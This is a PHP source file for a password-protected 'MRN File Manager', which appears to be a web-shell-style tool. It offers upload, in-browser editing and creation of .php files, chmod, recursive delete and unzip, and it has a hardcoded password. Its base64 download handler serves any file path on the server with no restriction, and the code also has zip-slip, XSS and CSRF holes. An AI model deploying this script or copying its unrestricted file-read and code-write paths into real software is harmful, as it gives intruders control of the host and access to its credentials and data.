<?php
/**
 * MRN File Manager - Professional File Manager
 * Fixed: Recursive delete (folders & files)
 * Fixed: Simple textarea editor (shows content properly)
 */

// ========== CONFIGURATION ==========
$correct_password = 'RABAT-DC';  // CHANGE THIS!
$timeout = 1800; // Auto logout after 30 minutes
// ====================================

session_start();

// Timeout check
if (isset($_SESSION['last_activity']) && (time() - $_SESSION['last_activity'] > $timeout)) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}
$_SESSION['last_activity'] = time();

// Logout
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Login
if (isset($_POST['password']) && $_POST['password'] === $correct_password) {
    $_SESSION['authenticated'] = true;
}

if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    ?>
    <!DOCTYPE html>
    <html><head><title>MRN File Manager - Login</title><style>
        body{background:#0f0f1a;font-family:'Segoe UI',sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;}
        .login-box{background:#1a1a2a;padding:40px;border-radius:16px;box-shadow:0 0 20px rgba(0,255,0,0.1);text-align:center;width:320px;}
        .login-box h2{color:#0f0;margin-bottom:20px;}
        input[type=password]{width:100%;padding:12px;margin:15px 0;border-radius:8px;border:1px solid #2a2a3a;background:#0a0a1a;color:#0f0;font-size:14px;}
        button{background:#0f0;color:#000;border:none;padding:10px 20px;border-radius:8px;cursor:pointer;font-weight:bold;}
        button:hover{background:#0c0;}
    </style></head>
    <body><div class="login-box"><h2>🔐 MRN File Manager</h2>
    <form method="POST"><input type="password" name="password" placeholder="Enter Password" autofocus required>
    <button type="submit">Login</button></form></div></body></html>
    <?php
    exit;
}

// ------------------------------------------------------------
//  MAIN FILE MANAGER CODE
// ------------------------------------------------------------
$base_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : __DIR__;
if ($base_dir === false || strpos($base_dir, realpath($_SERVER['DOCUMENT_ROOT'])) !== 0) {
    $base_dir = __DIR__;
}
$current_dir = $base_dir;

function getRelativePath($path) {
    $doc_root = realpath($_SERVER['DOCUMENT_ROOT']);
    return str_replace($doc_root, '', $path);
}

$message = '';

// ----- HELPER: Recursive Delete -----
function deleteRecursive($path) {
    if (!file_exists($path)) return true;
    if (is_file($path)) return unlink($path);
    if (is_dir($path)) {
        foreach (scandir($path) as $item) {
            if ($item == '.' || $item == '..') continue;
            if (!deleteRecursive($path . '/' . $item)) return false;
        }
        return rmdir($path);
    }
    return false;
}

// ----- HANDLE DOWNLOAD (using base64 encoded path) -----
if (isset($_GET['download_base64'])) {
    $file_path = base64_decode($_GET['download_base64']);
    if (file_exists($file_path) && is_file($file_path)) {
        ob_clean();
        flush();
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file_path) . '"');
        header('Content-Length: ' . filesize($file_path));
        readfile($file_path);
        exit;
    } else {
        die("File not found.");
    }
}

// ----- BULK ACTIONS -----
if (isset($_POST['bulk_action']) && isset($_POST['selected'])) {
    $selected = $_POST['selected'];
    $action = $_POST['bulk_action'];
    if ($action == 'delete') {
        $deleted = 0;
        foreach ($selected as $item) {
            $path = $current_dir . '/' . $item;
            if (deleteRecursive($path)) $deleted++;
        }
        $message = "Deleted $deleted item(s).";
    } elseif ($action == 'copy_clip') {
        $_SESSION['clipboard'] = ['mode' => 'copy', 'items' => $selected, 'source_dir' => $current_dir];
        $message = "Copied " . count($selected) . " item(s) to clipboard. Go to another folder and click 'Paste Here'.";
    } elseif ($action == 'move_clip') {
        $_SESSION['clipboard'] = ['mode' => 'move', 'items' => $selected, 'source_dir' => $current_dir];
        $message = "Moved " . count($selected) . " item(s) to clipboard. Go to another folder and click 'Paste Here'.";
    }
}

// ----- PASTE CLIPBOARD -----
if (isset($_POST['paste_here']) && isset($_SESSION['clipboard'])) {
    $clip = $_SESSION['clipboard'];
    $mode = $clip['mode'];
    $source_dir = $clip['source_dir'];
    $items = $clip['items'];
    $count = 0;
    foreach ($items as $item) {
        $src = $source_dir . '/' . $item;
        $dst = $current_dir . '/' . basename($item);
        if ($mode == 'copy') {
            if (is_file($src)) copy($src, $dst);
            elseif (is_dir($src)) {
                mkdir($dst);
                $files = array_diff(scandir($src), array('.','..'));
                foreach ($files as $f) copy($src . '/' . $f, $dst . '/' . $f);
            }
            $count++;
        } elseif ($mode == 'move') {
            if (is_file($src)) rename($src, $dst);
            elseif (is_dir($src)) rename($src, $dst);
            $count++;
        }
    }
    unset($_SESSION['clipboard']);
    $message = "$mode " . ($mode=='copy'?'Copied':'Moved') . " $count item(s) here.";
}

// ----- SINGLE FILE ACTIONS (except download) -----
if (isset($_POST['single_action'])) {
    $target = $_POST['target'];
    $path = $current_dir . '/' . $target;
    switch ($_POST['single_action']) {
        case 'rename':
            $new = $_POST['new_name'];
            if (!empty($new) && rename($path, $current_dir . '/' . $new))
                $message = "Renamed to $new";
            else $message = "Rename failed";
            break;
        case 'delete':
            if (deleteRecursive($path))
                $message = "Deleted $target";
            else
                $message = "Failed to delete $target";
            break;
        case 'chmod':
            $mode = octdec($_POST['mode']);
            if (chmod($path, $mode)) $message = "Chmod changed";
            else $message = "Chmod failed";
            break;
        case 'zip':
            if (is_dir($path)) {
                $zipname = $current_dir . '/' . $target . '.zip';
                $zip = new ZipArchive();
                if ($zip->open($zipname, ZipArchive::CREATE) === TRUE) {
                    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path), RecursiveIteratorIterator::LEAVES_ONLY);
                    foreach ($files as $file) {
                        if (!$file->isDir()) {
                            $realPath = $file->getRealPath();
                            $relativePath = substr($realPath, strlen($path) + 1);
                            $zip->addFile($realPath, $relativePath);
                        }
                    }
                    $zip->close();
                    $message = "Zipped to " . $target . ".zip";
                } else $message = "Zip failed";
            } else $message = "Not a directory";
            break;
    }
}

// ----- UNZIP (in same folder) -----
if (isset($_POST['unzip_here']) && isset($_POST['zip_file'])) {
    $zipfile = $current_dir . '/' . $_POST['zip_file'];
    if (file_exists($zipfile)) {
        $zip = new ZipArchive();
        if ($zip->open($zipfile) === TRUE) {
            $zip->extractTo($current_dir);
            $zip->close();
            $message = "Unzipped successfully into current folder.";
        } else $message = "Cannot unzip";
    } else $message = "ZIP file not found";
}

// ----- UPLOAD -----
if (isset($_FILES['upload'])) {
    $count = 0;
    foreach ($_FILES['upload']['tmp_name'] as $i => $tmp) {
        if ($_FILES['upload']['error'][$i] == UPLOAD_ERR_OK) {
            $name = basename($_FILES['upload']['name'][$i]);
            move_uploaded_file($tmp, $current_dir . '/' . $name);
            $count++;
        }
    }
    $message .= "$count file(s) uploaded.";
}

// ----- CREATE NEW FILE -----
if (isset($_POST['new_file'])) {
    $filename = $_POST['filename'];
    $ext = $_POST['ext'];
    $fullname = $filename . $ext;
    if (!file_exists($current_dir . '/' . $fullname)) {
        file_put_contents($current_dir . '/' . $fullname, '');
        $message = "Created file: $fullname";
    } else $message = "File exists";
}

// ----- CREATE NEW FOLDER -----
if (isset($_POST['new_folder'])) {
    $foldername = $_POST['foldername'];
    if (!file_exists($current_dir . '/' . $foldername)) {
        mkdir($current_dir . '/' . $foldername, 0755);
        $message = "Folder created: $foldername";
    } else $message = "Folder exists";
}

// ----- SAVE EDITED FILE -----
if (isset($_POST['save_content'])) {
    $file = $current_dir . '/' . $_POST['file'];
    file_put_contents($file, $_POST['content']);
    $message = "File saved: " . htmlspecialchars($_POST['file']);
    header("Location: ?dir=" . urlencode($current_dir));
    exit;
}

// ----- SEARCH MODE -----
$search_term = isset($_GET['search']) ? trim($_GET['search']) : '';
$search_mode = false;
if ($search_term !== '') {
    $all_items = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($current_dir), RecursiveIteratorIterator::SELF_FIRST);
    $search_results = [];
    foreach ($all_items as $item) {
        if ($item->getFilename() == '.' || $item->getFilename() == '..') continue;
        if (stripos($item->getFilename(), $search_term) !== false) {
            $relative = substr($item->getPathname(), strlen($current_dir)+1);
            $search_results[] = $relative;
        }
    }
    $search_mode = true;
}

// ----- EDIT MODE (SIMPLE TEXTAREA - FIXED) -----
$edit_file = isset($_GET['edit']) ? $_GET['edit'] : null;
if ($edit_file) {
    $full_edit_path = $current_dir . '/' . $edit_file;
    
    if (!file_exists($full_edit_path)) {
        die("❌ File not found: " . htmlspecialchars($full_edit_path));
    }
    if (!is_file($full_edit_path)) {
        die("❌ Not a file: " . htmlspecialchars($edit_file));
    }
    if (!is_readable($full_edit_path)) {
        die("❌ Permission denied: cannot read file.");
    }
    
    $file_content = file_get_contents($full_edit_path);
    if ($file_content === false) {
        die("❌ Failed to read file content.");
    }
    
    $file_name = htmlspecialchars(basename($edit_file));
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>Edit: <?php echo $file_name; ?> - MRN File Manager</title>
        <style>
            body {
                background: #1e1e2f;
                color: #e0e0e0;
                font-family: 'Segoe UI', monospace;
                padding: 20px;
                margin: 0;
            }
            .editor-container {
                max-width: 1200px;
                margin: 0 auto;
                background: #2a2a3a;
                border-radius: 12px;
                padding: 20px;
            }
            h2 {
                color: #0f0;
                margin-top: 0;
            }
            textarea {
                width: 100%;
                min-height: 500px;
                background: #0a0a1a;
                color: #0f0;
                border: 1px solid #3a3a4a;
                border-radius: 8px;
                padding: 12px;
                font-family: 'Courier New', monospace;
                font-size: 14px;
                line-height: 1.5;
                resize: vertical;
            }
            button, a.button {
                background: #0f0;
                color: #000;
                border: none;
                padding: 8px 16px;
                border-radius: 6px;
                cursor: pointer;
                font-weight: bold;
                text-decoration: none;
                display: inline-block;
                margin-right: 10px;
            }
            a {
                color: #0f0;
                text-decoration: none;
            }
            .toolbar {
                margin-bottom: 20px;
            }
        </style>
    </head>
    <body>
    <div class="editor-container">
        <div class="toolbar">
            <a href="?dir=<?php echo urlencode($current_dir); ?>">🔙 Back to File Manager</a>
        </div>
        <h2>✏️ Editing: <?php echo $file_name; ?></h2>
        <form method="POST">
            <textarea name="content"><?php echo htmlspecialchars($file_content); ?></textarea><br><br>
            <input type="hidden" name="file" value="<?php echo htmlspecialchars($edit_file); ?>">
            <input type="hidden" name="save_content" value="1">
            <button type="submit">💾 Save Changes</button>
            <a href="?dir=<?php echo urlencode($current_dir); ?>">❌ Cancel</a>
        </form>
    </div>
    </body>
    </html>
    <?php
    exit;
}

// ----- INLINE RENAME -----
$rename_item = isset($_GET['rename']) ? $_GET['rename'] : null;
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>MRN File Manager Pro</title>
    <style>
        *{box-sizing:border-box;}
        body{background:#0f0f1a;color:#e0e0e0;font-family:'Segoe UI',monospace;font-size:13px;padding:20px;margin:0;}
        .container{max-width:1400px;margin:0 auto;}
        h1{font-size:26px;color:#0f0;}
        .sub{color:#8a8a8a;margin-bottom:20px;border-bottom:1px solid #2a2a3a;padding-bottom:10px;}
        .toolbar{background:#1a1a2a;padding:12px;border-radius:12px;margin-bottom:20px;display:flex;flex-wrap:wrap;gap:10px;align-items:center;}
        .toolbar form{display:inline-flex;gap:5px;background:#0f0f1a;padding:5px 12px;border-radius:8px;}
        input,select,button{background:#0a0a1a;color:#0f0;border:1px solid #2a2a3a;padding:6px 10px;border-radius:6px;}
        button{cursor:pointer;}
        a{color:#0f0;text-decoration:none;}
        .message{background:#2a2a3a;border-left:4px solid #0f0;padding:10px 15px;margin-bottom:20px;border-radius:8px;}
        table{width:100%;border-collapse:collapse;background:#1a1a2a;border-radius:12px;}
        th,td{padding:10px 12px;text-align:left;border-bottom:1px solid #2a2a3a;}
        th{background:#0f0f1a;color:#0f0;}
        .actions a, .actions button{margin:0 3px;padding:4px 8px;font-size:11px;}
        .file-check{width:30px;}
        .clipboard-info{background:#2a2a2a;color:#ff0;padding:8px 15px;border-radius:8px;display:inline-block;margin-bottom:15px;}
        .badge{background:#0f0;color:#000;padding:2px 6px;border-radius:20px;font-size:10px;margin-left:8px;}
        .back-button{background:#1a1a2a;padding:5px 12px;border-radius:8px;display:inline-flex;gap:5px;margin-right:15px;}
    </style>
</head>
<body>
<div class="container">
    <h1>📁 MRN File Manager <span class="badge">PRO</span></h1>
    <div class="sub">Secure • Fast • Full Control</div>

    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px; flex-wrap:wrap;">
        <div style="display:flex; align-items:center; gap:15px;">
            <?php 
            $parent_dir = dirname($current_dir);
            if ($parent_dir && $parent_dir != $current_dir && strpos($parent_dir, realpath($_SERVER['DOCUMENT_ROOT'])) === 0):
            ?>
                <div class="back-button"><a href="?dir=<?php echo urlencode($parent_dir); ?>">🔙 Go Back (Parent)</a></div>
            <?php endif; ?>
            <div><strong>📍 Location:</strong> <?php echo htmlspecialchars(getRelativePath($current_dir) ?: '/'); ?></div>
        </div>
        <div><a href="?logout=1">🔒 Logout</a> | <a href="?dir=<?php echo urlencode($_SERVER['DOCUMENT_ROOT']); ?>">🏠 Root</a></div>
    </div>

    <?php if ($message): ?>
        <div class="message"><?php echo $message; ?></div>
    <?php endif; ?>

    <?php if (isset($_SESSION['clipboard'])): ?>
        <div class="clipboard-info">📋 Clipboard: <?php echo count($_SESSION['clipboard']['items']); ?> item(s) (<?php echo $_SESSION['clipboard']['mode']; ?>) 
        <form method="POST" style="display:inline;"><button type="submit" name="paste_here" value="1">📌 Paste Here</button></form>
        <form method="POST" style="display:inline;" action="?clear_clip=1"><button type="submit" name="clear_clip" value="1">❌ Clear</button></form>
        </div>
        <?php if (isset($_GET['clear_clip'])) { unset($_SESSION['clipboard']); header("Location: ?dir=".urlencode($current_dir)); exit; } ?>
    <?php endif; ?>

    <div class="toolbar">
        <form method="GET"><input type="text" name="dir" value="<?php echo htmlspecialchars($current_dir); ?>" size="45"><button>Go</button></form>
        <form method="POST" enctype="multipart/form-data"><input type="file" name="upload[]" multiple><button>⬆ Upload</button></form>
        <form method="POST"><input type="text" name="filename" placeholder="newfile" size="10" required><select name="ext"><option>.php</option><option>.html</option><option>.txt</option><option>.css</option><option>.js</option></select><button name="new_file">➕ File</button></form>
        <form method="POST"><input type="text" name="foldername" placeholder="folder_name" size="10" required><button name="new_folder">📂 Folder</button></form>
        <form method="POST"><input type="text" name="zip_file" placeholder="file.zip" size="12" required><button name="unzip_here">📦 Unzip here</button></form>
        <form method="GET" style="margin-left:auto;"><input type="hidden" name="dir" value="<?php echo htmlspecialchars($current_dir); ?>"><input type="text" name="search" placeholder="🔍 Search..." value="<?php echo htmlspecialchars($search_term); ?>" size="20"><button>Search</button><?php if ($search_term): ?><a href="?dir=<?php echo urlencode($current_dir); ?>">Clear</a><?php endif; ?></form>
    </div>

    <form method="POST" id="bulkForm" onsubmit="return confirm('Proceed with bulk action?');">
        <div style="margin-bottom:12px;"><select name="bulk_action"><option value="delete">🗑️ Delete selected</option><option value="copy_clip">📋 Copy to clipboard</option><option value="move_clip">✂️ Move to clipboard</option></select><button type="submit">Apply</button></div>
        <table>
            <thead><tr><th class="file-check"><input type="checkbox" id="selectAll"></th><th>Name</th><th>Size</th><th>Modified</th><th>Actions</th></tr></thead>
            <tbody>
                <?php
                if ($search_mode) $items = $search_results;
                else $items = scandir($current_dir);
                foreach ($items as $item):
                    if ($item == '.' || $item == '..') continue;
                    $full_path = $current_dir . '/' . $item;
                    $isDir = is_dir($full_path);
                    $size = $isDir ? '-' : number_format(filesize($full_path)) . ' B';
                    $modified = date('Y-m-d H:i:s', filemtime($full_path));
                ?>
                <tr>
                    <td class="file-check"><input type="checkbox" name="selected[]" value="<?php echo htmlspecialchars($item); ?>"></td>
                    <td>
                        <?php echo $isDir ? '📁' : '📄'; ?>
                        <?php if (!$search_mode && $rename_item == $item): ?>
                            <form method="POST" style="display:inline;">
                                <input type="hidden" name="single_action" value="rename">
                                <input type="hidden" name="target" value="<?php echo htmlspecialchars($item); ?>">
                                <input type="text" name="new_name" value="<?php echo htmlspecialchars($item); ?>" style="width:150px;" required>
                                <button type="submit">✔</button>
                                <a href="?dir=<?php echo urlencode($current_dir); ?>">✖</a>
                            </form>
                        <?php else: ?>
                            <?php if ($isDir): ?>
                                <a href="?dir=<?php echo urlencode($full_path); ?>"><?php echo htmlspecialchars($item); ?>/</a>
                            <?php else: ?>
                                <a href="?dir=<?php echo urlencode($current_dir); ?>&edit=<?php echo urlencode($item); ?>"><?php echo htmlspecialchars($item); ?></a>
                            <?php endif; ?>
                            <?php if (!$search_mode): ?>
                                <a href="?dir=<?php echo urlencode($current_dir); ?>&rename=<?php echo urlencode($item); ?>" style="font-size:10px;">✏️</a>
                            <?php endif; ?>
                        <?php endif; ?>
                    </td>
                    <td><?php echo $size; ?></td>
                    <td><?php echo $modified; ?></td>
                    <td class="actions">
                        <?php if (!$isDir): ?>
                            <a href="?dir=<?php echo urlencode($current_dir); ?>&edit=<?php echo urlencode($item); ?>">Edit</a>
                            <?php $download_path = base64_encode($full_path); ?>
                            <a href="?download_base64=<?php echo urlencode($download_path); ?>">Download</a>
                            <?php if (preg_match('/\.(html|htm)$/i', $item)): ?>
                                <?php $web_path = str_replace($_SERVER['DOCUMENT_ROOT'], '', $current_dir); ?>
                                <a href="<?php echo $web_path . '/' . $item; ?>" target="_blank">🌐 Preview</a>
                            <?php endif; ?>
                            <?php if (preg_match('/\.(jpg|jpeg|png|gif|webp)$/i', $item)): ?>
                                <?php $web_path_img = str_replace($_SERVER['DOCUMENT_ROOT'], '', $current_dir); ?>
                                <a href="javascript:void(0)" onclick="previewImage('<?php echo $web_path_img . '/' . $item; ?>')">🖼️ Preview</a>
                            <?php endif; ?>
                        <?php else: ?>
                            <form method="POST" style="display:inline;"><input type="hidden" name="single_action" value="zip"><input type="hidden" name="target" value="<?php echo htmlspecialchars($item); ?>"><button type="submit">Zip</button></form>
                        <?php endif; ?>
                        <form method="POST" style="display:inline;" onsubmit="return confirm('Delete?')"><input type="hidden" name="single_action" value="delete"><input type="hidden" name="target" value="<?php echo htmlspecialchars($item); ?>"><button type="submit">Del</button></form>
                        <form method="POST" style="display:inline;"><input type="hidden" name="single_action" value="chmod"><input type="hidden" name="target" value="<?php echo htmlspecialchars($item); ?>"><input type="text" name="mode" placeholder="0755" size="4" required><button type="submit">Chmod</button></form>
                    </td>
                </tr>
                <?php endforeach; ?>
                <?php if ($search_mode && empty($items)): ?><tr><td colspan="5">No results found for "<?php echo htmlspecialchars($search_term); ?>"</td></tr><?php endif; ?>
            </tbody>
        </table>
    </form>
    <div class="small" style="margin-top:20px;text-align:center;color:#666;">✅ Checkboxes → bulk actions | 📌 Copy/Move via clipboard | 🔍 Recursive search | 🔙 Go Back | ⬇️ Download fixed (base64)</div>
</div>
<div id="imageModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:9999; text-align:center; padding-top:60px;"><span style="position:absolute; top:20px; right:40px; color:#fff; font-size:45px; cursor:pointer;" onclick="document.getElementById('imageModal').style.display='none'">&times;</span><img id="previewImg" style="max-width:90%; max-height:85%; border-radius:12px;"></div>
<script>
    function previewImage(url) { document.getElementById('previewImg').src = url; document.getElementById('imageModal').style.display = 'block'; }
    document.getElementById('selectAll')?.addEventListener('change', function(e) { document.querySelectorAll('input[name="selected[]"]').forEach(cb => cb.checked = e.target.checked); });
</script>
</body>
</html>